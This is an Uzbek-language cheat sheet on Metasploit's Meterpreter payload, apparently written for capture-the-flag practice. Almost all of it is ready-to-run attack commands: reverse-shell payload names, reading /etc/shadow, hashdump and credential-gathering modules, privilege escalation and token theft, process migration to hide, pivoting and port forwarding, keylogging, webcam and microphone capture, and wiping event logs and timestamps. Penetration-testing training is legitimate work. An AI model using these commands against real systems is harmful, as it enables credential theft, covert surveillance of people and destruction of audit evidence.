# 🐚 Metasploit: Meterpreter (Meterpreter)

> **Maqsad:** Meterpreter payload ning imkoniyatlari, post-exploitation va pivoting texnikalarini o'rganish.

---

## 📖 Meterpreter nima?

**Meterpreter** — Metasploit ning eng kuchli payloadi. Xotirada (in-memory) ishlaydi — diskka yozilmaydi, shuning uchun antivirus uchun qiyin.

```
Oddiy shell:
  - Cheklangan buyruqlar
  - Diskga yoziladi (aniqlanishi mumkin)
  - Tarmoq imkoniyatlari yo'q

Meterpreter:
  - Ko'p imkoniyatlar
  - Faqat xotirada ishlaydi
  - Tarmoq, fayl, kamera, keylogger...
  - Pivot va port forwarding
```

---

## 🔍 Meterpreter Versiyalari

```bash
# Ko'rish:
msfvenom -l payloads | grep meterpreter

# Asosiy versiyalar:
windows/meterpreter/reverse_tcp          # Windows 32-bit
windows/x64/meterpreter/reverse_tcp      # Windows 64-bit
linux/x86/meterpreter/reverse_tcp        # Linux 32-bit
linux/x64/meterpreter/reverse_tcp        # Linux 64-bit
php/meterpreter/reverse_tcp              # PHP
python/meterpreter/reverse_tcp           # Python
android/meterpreter/reverse_tcp          # Android
java/meterpreter/reverse_tcp             # Java

# Staged vs Stageless:
windows/meterpreter/reverse_tcp          # Staged (/)
windows/meterpreter_reverse_tcp          # Stageless (_)
```

---

## 🖥️ Tizim Ma'lumotlari

```bash
# Asosiy ma'lumotlar:
sysinfo                    # OS, hostname, arxitektura
getuid                     # Joriy foydalanuvchi
getpid                     # Joriy process ID
ps                         # Barcha processlar
pwd                        # Joriy papka
getenv PATH                # Muhit o'zgaruvchisi

# Windows uchun:
getprivs                   # Imtiyozlar ro'yxati
```

---

## 📁 Fayl Tizimi

```bash
# Navigatsiya:
ls                         # Fayl ro'yxati
ls -la                     # Batafsil
cd /tmp                    # Papkaga o'tish
pwd                        # Joylashув

# Fayl operatsiyalari:
cat /etc/passwd            # Fayl o'qish
download /etc/passwd       # Yuklab olish
download /etc/shadow .     # Joriy papkaga
upload shell.php /var/www/ # Yuklash
rm file.txt                # O'chirish
mkdir /tmp/test            # Papka yaratish

# Qidirish:
search -f flag.txt         # Fayl qidirish
search -f *.txt -d /home   # Papkada qidirish
```

---

## 🔑 Credential Va Imtiyoz

```bash
# Linux:
cat /etc/passwd            # Foydalanuvchilar
cat /etc/shadow            # Parol hashlari (root kerak)

# Windows:
hashdump                   # SAM ma'lumotlar bazasi hashlari
run post/windows/gather/credentials/credential_collector

# Imtiyoz oshirish:
getsystem                  # SYSTEM ga o'tish (Windows)
# Usullar:
# 1. Named Pipe Impersonation
# 2. Token Duplication
# 3. Named Pipe with Token Impersonation

# Joriy imtiyozlar:
getprivs

# Token o'g'irlash (Incognito):
use incognito
list_tokens -u             # Mavjud tokenlar
impersonate_token "NT AUTHORITY\\SYSTEM"
```

---

## ⚙️ Process Boshqarish

```bash
# Processlar ro'yxati:
ps

# Process ga ko'chish (yashirinish):
migrate PID                # Process ID ga ko'chish
migrate -N explorer.exe    # Nom bo'yicha

# Nima uchun migrate?
# - Qo'shimcha imtiyoz olish
# - Turg'unlik (process o'lsa shell ham o'ladi)
# - Yashirinish (explorer.exe normal process)

# Misol:
ps | grep explorer
migrate 1234               # explorer.exe PID

# Process yaratish:
execute -f notepad.exe
execute -f cmd.exe -i      # Interaktiv
```

---

## 🌐 Tarmoq

```bash
# Tarmoq ma'lumotlari:
ipconfig                   # Windows
ifconfig                   # Linux
arp                        # ARP jadvali
netstat                    # Tarmoq ulanishlar
route                      # Routing jadval

# Port forwarding:
portfwd add -l 3389 -p 3389 -r 10.10.10.1
# -l = lokal port
# -p = masofaviy port
# -r = masofaviy host
portfwd list               # Ro'yxat
portfwd delete -l 3389     # O'chirish

# Pivot (ichki tarmoqqa kirish):
route add 192.168.1.0/24 SESSION_ID
run auxiliary/server/socks_proxy SRVPORT=9050 VERSION=5
# proxychains bilan ishlatish
```

---

## 🕵️ Razvedka va Ma'lumot Yig'ish

```bash
# Tizim ma'lumotlari:
run post/multi/recon/local_exploit_suggester    # Zaiflik topish
run post/linux/gather/enum_system               # Linux tizim
run post/windows/gather/enum_system             # Windows tizim

# Fayllar:
run post/linux/gather/enum_configs             # Konfiguratsiya
run post/linux/gather/hashdump                 # Parol hashlari
run post/windows/gather/credentials/windows_autologin

# Tarmoq:
run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.1.1
```

---

## 🎭 Yashirinish (Evasion)

```bash
# Timestomp — fayl vaqtini o'zgartirish:
timestomp file.txt -m "01/01/2020 00:00:00"
timestomp file.txt -z "01/01/2020 00:00:00"  # Barcha vaqtlar

# Event loglarni o'chirish (Windows):
clearev

# Antivirus tekshirish:
run post/multi/manage/shell_to_meterpreter
```

---

## 💻 Keylogger va Monitoring

```bash
# Keylogger:
keyscan_start              # Boshlash
keyscan_dump               # Ko'rish
keyscan_stop               # To'xtatish

# Screenshot:
screenshot                 # Ekran rasmi

# Webcam (Windows):
webcam_list                # Kameralar
webcam_snap                # Rasm olish
webcam_stream              # Jonli efir

# Audio:
record_mic -d 10           # 10 soniya yozib olish
```

---

## 🔄 Shell ↔ Meterpreter

```bash
# Oddiy shelldan Meterpreter ga:
# 1. Background da qo'y:
CTRL+Z

# 2. Shell to meterpreter:
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
# Yangi Meterpreter sessiyasi yaratiladi!

# Meterpreterdan oddiy shellga:
shell
# Orqaga:
exit
```

---

## 🎯 Amaliy Misol: To'liq Post-Exploitation

```bash
# Shell olgandan keyin:

# 1. Kim ekanligimiz:
getuid
# www-data

# 2. Tizim ma'lumoti:
sysinfo

# 3. Imtiyoz oshirish tavsiyasi:
run post/multi/recon/local_exploit_suggester
# → Tavsiya etilgan exploitlar ro'yxati

# 4. Flaglarni topish:
search -f user.txt
search -f root.txt
search -f flag*.txt

# 5. Parol hashlari:
run post/linux/gather/hashdump

# 6. Tarmoq:
ifconfig
run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24
```

---

## 💡 Eslab Qolish Uchun

| Kategoriya | Buyruqlar |
|-----------|---------|
| **Tizim** | `sysinfo, getuid, ps, getprivs` |
| **Fayl** | `ls, cd, download, upload, search -f` |
| **Imtiyoz** | `getsystem, hashdump, migrate` |
| **Tarmoq** | `ipconfig, portfwd, route` |
| **Yashirinish** | `migrate, clearev, timestomp` |
| **Monitoring** | `keyscan_start, screenshot, webcam_snap` |

```bash
# Post-exploit tezkor:
getuid                              # Kim?
sysinfo                             # Tizim?
run post/multi/recon/local_exploit_suggester  # Zaiflik?
search -f flag.txt                  # Flag?
hashdump                            # Parollar?
```
